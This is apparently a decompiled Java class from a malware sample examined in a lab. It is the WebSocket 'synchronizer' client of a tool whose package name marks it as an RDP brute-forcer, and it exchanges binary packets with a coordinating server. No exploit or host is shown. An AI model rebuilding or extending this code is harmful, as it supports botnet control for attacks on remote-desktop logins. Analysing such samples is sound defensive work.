/*     */ package rdp.gold.brute.synchronizer;
/*     */ 
/*     */ import java.io.PrintWriter;
/*     */ import java.io.StringWriter;
/*     */ import java.lang.reflect.Constructor;
/*     */ import java.nio.ByteBuffer;
/*     */ import java.util.concurrent.CountDownLatch;
/*     */ import java.util.concurrent.TimeUnit;
/*     */ import org.apache.log4j.Logger;
/*     */ import org.eclipse.jetty.websocket.api.RemoteEndpoint;
/*     */ import org.eclipse.jetty.websocket.api.Session;
/*     */ import org.eclipse.jetty.websocket.api.annotations.OnWebSocketClose;
/*     */ import org.eclipse.jetty.websocket.api.annotations.OnWebSocketConnect;
/*     */ import org.eclipse.jetty.websocket.api.annotations.OnWebSocketMessage;
/*     */ import org.eclipse.jetty.websocket.api.annotations.WebSocket;
/*     */ import rdp.gold.brute.synchronizer.packages.ReadPackage;
/*     */ import rdp.gold.brute.synchronizer.packages.WritePackage;
/*     */ import rdp.gold.brute.synchronizer.packages.read.PinPackage;
/*     */ 
/*     */ @WebSocket(maxBinaryMessageSize=1048576)
/*     */ public class SynchronizerSocket
/*     */   extends Thread
/*     */ {
/*  24 */   private final Logger logger = Logger.getLogger(SynchronizerSocket.class);
/*     */   
/*     */   private Session session;
/*     */   
/*     */   private RemoteEndpoint remote;
/*     */   
/*     */   private Class<?> awaitReadPackage;
/*  31 */   private SynchronizerInfo synchronizerInfo = new SynchronizerInfo();
/*     */   
/*  33 */   private CountDownLatch connectAwait = new CountDownLatch(1);
/*     */   
/*     */   public SynchronizerSocket() {
/*  36 */     this.awaitReadPackage = PinPackage.class;
/*     */   }
/*     */   
/*     */   public void run()
/*     */   {
/*     */     try {
/*  42 */       this.connectAwait.await(11000L, TimeUnit.MILLISECONDS);
/*     */       
/*  44 */       if (this.session != null) {
/*  45 */         this.logger.info("Connected");
/*     */       }
/*     */       
/*  48 */       while ((this.session != null) && (this.session.isOpen())) {
/*  49 */         Thread.sleep(1000L);
/*     */       }
/*     */       
/*  52 */       this.logger.info("Remove SynchronizerSocket");
/*     */     }
/*     */     catch (InterruptedException localInterruptedException) {}
/*     */   }
/*     */   
/*     */   @OnWebSocketConnect
/*     */   public void onConnect(Session sessionJetty) {
/*  59 */     this.logger.info("onConnect");
/*     */     
/*  61 */     this.session = sessionJetty;
/*  62 */     this.remote = this.session.getRemote();
/*     */     
/*  64 */     this.connectAwait.countDown();
/*     */   }
/*     */   
/*     */   @OnWebSocketMessage
/*     */   public void onMessage(String message) {
/*  69 */     this.logger.info("onMessage: " + message);
/*     */   }
/*     */   
/*     */   @OnWebSocketMessage
/*     */   public void onMessage(byte[] bytes, int offset, int length) throws Exception
/*     */   {
/*     */     try
/*     */     {
/*  77 */       if (this.awaitReadPackage != null) {
/*  78 */         Constructor<?> constructorReadPackage = this.awaitReadPackage.getConstructor(new Class[] { SynchronizerInfo.class });
/*  79 */         ReadPackage packageRead = (ReadPackage)constructorReadPackage.newInstance(new Object[] { this.synchronizerInfo });
/*  80 */         packageRead.processPacket(bytes);
/*     */         
/*  82 */         this.logger.info("Read package: " + this.awaitReadPackage.getName());
/*     */         
/*  84 */         if (packageRead.getWritePackage() != null) {
/*  85 */           writePackage(packageRead.getWritePackage());
/*     */         } else {
/*  87 */           this.awaitReadPackage = packageRead.getAwaitPackage();
/*     */           
/*  89 */           if (this.awaitReadPackage != null) {
/*  90 */             this.logger.info("Await package: " + this.awaitReadPackage.getName());
/*     */           } else {
/*  92 */             this.logger.info("Close connect");
/*     */           }
/*     */         }
/*     */       }
/*     */     } catch (Exception e) {
/*  97 */       StringWriter sw = new StringWriter();
/*  98 */       e.printStackTrace(new PrintWriter(sw));
/*  99 */       this.logger.error(e + " " + sw);
/*     */       
/* 101 */       throw e;
/*     */     }
/*     */   }
/*     */   
/*     */   private void writePackage(Class<?> classPackageWrite) throws Exception {
/* 106 */     Constructor<?> constructorWritePackage = classPackageWrite.getConstructor(new Class[] { SynchronizerInfo.class });
/* 107 */     WritePackage packageWrite = (WritePackage)constructorWritePackage.newInstance(new Object[] { this.synchronizerInfo });
/* 108 */     ByteBuffer byteBuffer = packageWrite.getPackage();
/*     */     
/* 110 */     this.remote.sendBytes(byteBuffer);
/*     */     
/* 112 */     this.logger.info("Write package: " + packageWrite.getClass().getName());
/*     */     
/* 114 */     if (packageWrite.getWritePackage() != null) {
/* 115 */       writePackage(packageWrite.getWritePackage());
/*     */     } else {
/* 117 */       this.awaitReadPackage = packageWrite.getAwaitPackage();
/*     */       
/* 119 */       if (this.awaitReadPackage != null) {
/* 120 */         this.logger.info("Await package: " + this.awaitReadPackage.getName());
/*     */       } else {
/* 122 */         this.logger.info("Close connect");
/*     */       }
/*     */     }
/*     */   }
/*     */   
/*     */   @OnWebSocketClose
/*     */   public void onClose(int statusCode, String reason) {
/* 129 */     this.logger.info("Close: statusCode=" + statusCode + ", reason=" + reason);
/* 130 */     this.session.close();
/*     */   }
/*     */ }


/* Location:              C:\Users\Lab\Desktop\a.jar!\rdp\gold\brute\synchronizer\SynchronizerSocket.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       0.7.1
 */